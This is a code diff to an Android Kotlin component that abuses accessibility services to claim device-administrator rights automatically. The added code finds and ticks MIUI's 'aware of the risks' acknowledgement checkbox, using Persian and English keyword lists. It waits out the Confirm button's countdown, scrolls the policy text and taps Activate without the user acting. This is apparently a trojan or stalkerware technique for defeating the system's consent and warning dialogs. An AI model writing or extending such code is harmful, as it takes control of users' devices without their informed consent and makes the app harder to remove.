@@ -22,7 +22,7 @@ internal object DeviceAdminClaim {
     private const val TAG = "DeviceAdmin"
     private const val PREFS = "device_admin_claim"
     private const val KEY_DONE = "done_v1"
-    private const val MAX_MS = 45_000L
+    private const val MAX_MS = 90_000L
     private const val RELAUNCH_MS = 8_000L
     const val REQUEST_CODE = 0xADA1
 
@@ -122,18 +122,33 @@ internal object DeviceAdminClaim {
             return false
         }
         if (roots.isNotEmpty()) {
-            val button = findActivate(roots)
-            if (button != null && button.isEnabled) {
-                if (activate(service, button)) {
-                    Log.i(TAG, "tapped activate family=${PhoneFamily.current()} label=${nodeText(button)}")
+            // MIUI: risk checkbox must be on before Confirm; Confirm may count down.
+            val ack = findAckOff(roots)
+            if (ack != null) {
+                if (activate(service, ack)) {
+                    Log.i(TAG, "tapped ack checkbox family=${PhoneFamily.current()} label=${nodeText(ack)}")
                 }
             } else {
-                if (!loggedNodes) {
-                    loggedNodes = true
-                    Log.i(TAG, "activate waiting scroll enabled=${button?.isEnabled} nodes=${dumpLabels(roots)}")
+                val button = findActivate(roots)
+                val label = button?.let { nodeText(it) }.orEmpty()
+                if (button != null && button.isEnabled && !hasCountdown(label)) {
+                    if (activate(service, button)) {
+                        Log.i(TAG, "tapped activate family=${PhoneFamily.current()} label=$label")
+                    }
+                } else {
+                    if (!loggedNodes) {
+                        loggedNodes = true
+                        Log.i(
+                            TAG,
+                            "activate waiting scroll enabled=${button?.isEnabled} " +
+                                "countdown=${hasCountdown(label)} nodes=${dumpLabels(roots)}",
+                        )
+                    }
+                    if (button == null || !hasCountdown(label)) {
+                        scrollPolicy(roots)
+                        swipeUp(service)
+                    }
                 }
-                scrollPolicy(roots)
-                swipeUp(service)
             }
             UiGuideBridge.requestIfNeeded(service, "DEVICE_ADMIN", "device_admin")
         }
@@ -285,7 +300,7 @@ internal object DeviceAdminClaim {
 
     private fun scoreActivate(node: AccessibilityNodeInfo): Int {
         val text = nodeText(node)
-        if (isDeny(text) || isBack(text)) return 0
+        if (isDeny(text) || isBack(text) || hasCountdown(text)) return 0
         val id = node.viewIdResourceName.orEmpty()
         val idHit = id.endsWith("/action_button") ||
             id.endsWith("/restricted_action") ||
@@ -306,6 +321,66 @@ internal object DeviceAdminClaim {
         if (cls.endsWith("Button")) score += 40
         if (node.isClickable) score += 20
         return score
+    }
+
+    /** چک‌باکس «آگاه از خطرات» روی دیالوگ دوم MIUI — تا روشن نشود Confirm بی‌اثر است. */
+    private fun findAckOff(roots: List<AccessibilityNodeInfo>): AccessibilityNodeInfo? {
+        var unlabeled: AccessibilityNodeInfo? = null
+        var sawConfirm = false
+        for (root in roots) {
+            val queue = ArrayDeque<AccessibilityNodeInfo>()
+            queue.add(root)
+            var n = 0
+            while (queue.isNotEmpty() && n < 240) {
+                n++
+                val node = queue.removeFirst()
+                val text = nodeText(node)
+                if (isActivateLabel(text) && !isDeny(text)) sawConfirm = true
+                val cls = node.className?.toString().orEmpty()
+                val toggle = node.isCheckable ||
+                    cls.contains("Switch", ignoreCase = true) ||
+                    cls.contains("CheckBox", ignoreCase = true) ||
+                    cls.contains("CompoundButton", ignoreCase = true)
+                if (toggle && !node.isChecked) {
+                    if (isAckLabel(text) || isAckLabel(nearbyText(node))) return node
+                    if (unlabeled == null) unlabeled = node
+                }
+                for (i in 0 until node.childCount) {
+                    try {
+                        node.getChild(i)?.let { queue.add(it) }
+                    } catch (_: Throwable) {
+                    }
+                }
+            }
+        }
+        return if (sawConfirm) unlabeled else null
+    }
+
+    private fun nearbyText(node: AccessibilityNodeInfo): String {
+        val parent = try {
+            node.parent
+        } catch (_: Throwable) {
+            null
+        } ?: return ""
+        val parts = ArrayList<String>()
+        for (i in 0 until parent.childCount.coerceAtMost(8)) {
+            try {
+                val c = parent.getChild(i) ?: continue
+                val t = nodeText(c)
+                if (t.isNotEmpty()) parts += t
+            } catch (_: Throwable) {
+            }
+        }
+        return parts.joinToString(" ")
+    }
+
+    private fun hasCountdown(raw: String): Boolean =
+        COUNTDOWN_PARENS.containsMatchIn(raw)
+
+    private fun isAckLabel(raw: String): Boolean {
+        val t = raw.trim().lowercase()
+        if (t.isEmpty()) return false
+        return ACK.any { t.contains(it) }
     }
 
     private fun dumpLabels(roots: List<AccessibilityNodeInfo>): String {
@@ -422,6 +497,20 @@ internal object DeviceAdminClaim {
 
     private fun prefs(context: Context) =
         context.applicationContext.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
+
+    private val COUNTDOWN_PARENS = Regex("""\(\s*\d+\s*\)""")
+
+    private val ACK = listOf(
+        "آگاه",
+        "خطرات",
+        "خطر",
+        "risk",
+        "aware",
+        "understand",
+        "acknowledge",
+        "i know",
+        "من از",
+    )
 
     private val ACTIVATE = listOf(
         "activate",
